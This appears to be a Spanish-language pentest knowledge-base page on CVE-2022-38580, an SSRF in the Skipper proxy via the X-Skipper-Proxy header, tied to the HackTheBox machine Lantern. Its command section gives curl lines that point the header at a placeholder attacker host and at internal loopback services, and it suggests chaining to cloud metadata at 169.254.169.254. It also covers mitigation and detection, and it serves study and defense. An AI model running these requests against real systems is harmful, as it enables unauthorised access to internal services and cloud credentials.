---
topic: Skipper — SSRF con X-Skipper-Proxy (CVE-2022-38580)
tags: [web, skipper, ssrf, proxy, kubernetes, lantern]
---

# Skipper — SSRF con X-Skipper-Proxy (CVE-2022-38580)

[🌐 English](skipper-proxy-ssrf.en.md) | **Español**

## Concepto

Skipper es un router y proxy HTTP usado delante de aplicaciones, a menudo en Kubernetes. En versiones vulnerables acepta el header `X-Skipper-Proxy` y reenvía la petición al destino indicado sin validar que sea un backend permitido. Eso convierte el proxy en un SSRF: se alcanzan servicios internos que no están publicados.

CVE-2022-38580 afecta a Skipper antes de 0.16.0.

## Cuándo aplica

- Skipper expuesto como ingress o proxy.
- Versión anterior a la corregida.
- Servicios internos en `127.0.0.1`, red del pod o subred privada.
- En Lantern, el header permitía llegar a un servicio interno en `5000` con SQLite y un panel admin en `3000`.

## Procedimiento

1. Confirmar que el objetivo es Skipper (headers, comportamiento, versión).
2. Enviar `X-Skipper-Proxy` con una URL propia y comprobar si llega la petición.
3. Apuntar a servicios internos (`127.0.0.1:<PORT>`, `localhost`, IPs privadas).
4. Enumerar rutas y APIs internas.
5. Encadenar con la vulnerabilidad del servicio alcanzado.

## Comandos

```bash
curl -s -H 'X-Skipper-Proxy: http://<ATTACKER>/' http://<HOST>/
```

```bash
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:5000/' http://<HOST>/
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:3000/' http://<HOST>/
```

Para leer la respuesta interna:

```bash
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:5000/api/health' http://<HOST>/
```

## Variantes

- Probar `X-Skipper-Proxy` con y sin esquema, y con `Host` distinto.
- Usar `http://localhost`, `http://[::1]` o la IP del pod.
- Encadenar con metadatos cloud (`169.254.169.254`) si el proxy tiene salida.
- En Lantern, el servicio interno exponía una SQLi SQLite y un panel de administración.

## Limitaciones

- Versiones corregidas ignoran o validan el header.
- El proxy puede permitir solo hosts de una allowlist.
- La respuesta puede no reflejarse si el destino falla.
- La red del pod puede limitar los destinos.

## Mitigación

- Actualizar Skipper a 0.16.0 o superior.
- No confiar en headers controlados por el cliente para elegir el backend.
- Aplicar allowlist de destinos y bloquear IPs de metadatos y loopback.
- Segmentar la red y autenticar los servicios internos.

## Detección

- Peticiones con `X-Skipper-Proxy` hacia hosts internos o IPs de metadatos.
- Conexiones desde el proxy a puertos no publicados.
- Errores de conexión repetidos contra `127.0.0.1`.
- Aumento de tráfico a servicios internos desde el ingress.

## Referencias

- [NVD — CVE-2022-38580](https://nvd.nist.gov/vuln/detail/CVE-2022-38580)
- [Skipper — Security](https://github.com/zalando/skipper/security)
- [0xdf — Lantern](https://0xdf.gitlab.io/2025/03/01/htb-lantern.html)
- [Ficha Lantern](../../machines/linux/lantern/README.md)
